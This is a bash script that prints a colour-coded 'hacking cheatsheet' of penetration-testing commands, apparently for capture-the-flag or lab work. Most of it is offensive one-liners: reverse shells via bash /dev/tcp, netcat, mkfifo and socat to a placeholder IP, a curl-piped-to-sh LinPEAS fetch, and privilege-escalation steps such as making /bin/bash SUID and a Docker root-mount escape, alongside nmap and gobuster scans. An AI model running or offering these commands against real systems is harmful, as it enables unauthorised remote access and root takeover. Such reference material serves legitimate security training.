#!/bin/env bash

black="\e[30m"
red="\e[31m"
green="\e[32m"
yellow="\e[33m"
blue="\e[34m"
magenta="\e[35m"
cyan="\e[36m"
gray="\e[90m"
White="\e[97m"

ENDCOLOR="\e[0m"

function cecho () {
  COLOR=$2
  echo -e "${COLOR} $1 ${ENDCOLOR}"
}

echo -ne "\n\n"
cecho "  ╔════════════════════╗" $magenta
cecho "  ║ HACKING CHEATSHEET ║" $magenta
cecho "  ╚════════════════════╝ \n\n" $magenta



cecho "# NETWORK SCAN\n" $blue

cecho " # Host Discovery" $cyan
cecho " arp-scan -I eth0 --localnet --ignoredups\n" $green

cecho " # Scan open ports" $cyan
cecho " nmap -p- --open -sS -n -Pn --min-rate 5000 <target-ip> -oG allPorts\n" $green

cecho " # Info and version from ports" $cyan
cecho " nmap -p<ports> -sCV <target-ip> -oN portScan\n" $green

cecho " # Common web enumeration" $cyan
cecho " nmap -p<http-ports> --script http-enum <target-ip> -oN webScan\n\n" $green



cecho "# WEB SCAN\n" $blue

cecho " # Web file and directory enumeration" $cyan
cecho " gobuster dir -u <url> -w <wordlist> -t <threads> -x <extensions>\n" $green

cecho " # Subdomain enumeration" $cyan
cecho " gobuster vhost -u <url> -w <wordlist> -t <threads>\n\n" $green



cecho "# REVERSE SHELLS\n" $blue

cecho " # Bash" $cyan
cecho " bash -i >& /dev/tcp/<ip>/<port> 0>&1\n" $green

cecho " # Netcat" $cyan
cecho " nc -e /bin/bash <ip> <port>\n" $green

cecho " # Netcat mkfifo" $cyan
cecho " rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f\n" $green

cecho " # Socat" $cyan
cecho " socat tcp-connect:<ip>:<port> exec:/bin/bash,pty,stderr,setsid,sigint,sane\n\n" $green



cecho "# TTY INTERACTIVE SHELL\n" $blue

cecho " script /dev/null -c bash" $green
cecho " # <CTRL + z>" $cyan
cecho " stty raw -echo; fg" $green
cecho " reset xterm" $green
cecho " export TERM=xterm" $green
cecho " export SHELL=bash" $green
cecho " stty rows <rows> columns <cols>\n\n" $green



cecho "# PRIVILEGE ESCALATION\n" $blue

cecho " # LinPEAS" $cyan
cecho " curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n" $green

cecho " # List current user groups" $cyan
cecho " id\n" $green

cecho " # Find SUID on GUID files" $cyan
cecho " find / -perm -4000 2>/dev/null" $green
cecho " find / -perm -2000 2>/dev/null\n" $green

cecho " # Check capabilities" $cyan
cecho " getcap -r / 2>/dev/null\n" $green

cecho " # Check enviroment variables" $cyan
cecho " env\n" $green

cecho " # Find crontab logs" $cyan
cecho " find /var/log -name \"*cron*\" 2>/dev/null\n" $green

cecho " # Check if root is running any script" $cyan
cecho " ps faux | grep \"^root.*\" | grep -E '\.sh$|\.py$|\.pl$|\.rb$|\.go$|\.lua$'\n" $green

cecho " # Find root scripts with write permissions" $cyan
cecho " find / -user root -perm -o+w \( -name \"*.sh\" -o -name \"*.py\" -o -name \"*.pl\" -o -name \"*.rb\" -o -name \"*.go\" -o -name \"*.lua\" \) 2>/dev/null\n" $green

cecho " # Make bash SUID -> bash -p" $cyan
cecho " chmod u+s /bin/bash\n" $green

cecho " # Docker group privesc" $cyan
cecho " docker run -it --rm -v /:/mnt alpine chroot /mnt sh\n" $green
